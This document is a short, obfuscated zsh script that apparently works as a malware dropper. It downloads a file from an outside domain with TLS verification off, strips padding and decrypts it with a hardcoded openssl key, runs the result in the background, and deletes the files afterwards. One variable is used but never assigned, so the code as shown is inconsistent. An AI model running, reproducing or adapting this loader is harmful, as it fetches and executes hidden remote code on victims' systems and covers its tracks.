#!/bin/zsh
sh6cw=$(mktemp /tmp/rrr824.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m3053ccc05656c1b8.bin" -o "$sh6cwz" || exit 1
cmd7c8=$(stat -f %z "$sh6cwz"); nqy44h4=$(( cmd7c8 - 2116 - 1575 ))
tail -c +$(( 2116 + 1 )) "$sh6cwz" | head -c $nqy44h4 | openssl enc -d -aes-256-cbc -k 119620b89c84848330b5db0f -out "$sh6cw" 2>/dev/null
[ -s "$sh6cw" ] && chmod 700 "$sh6cw" && ( "$sh6cw" & ) && disown
( sleep 3; rm -f "$sh6cw" "$sh6cwz" ) &>/dev/null &
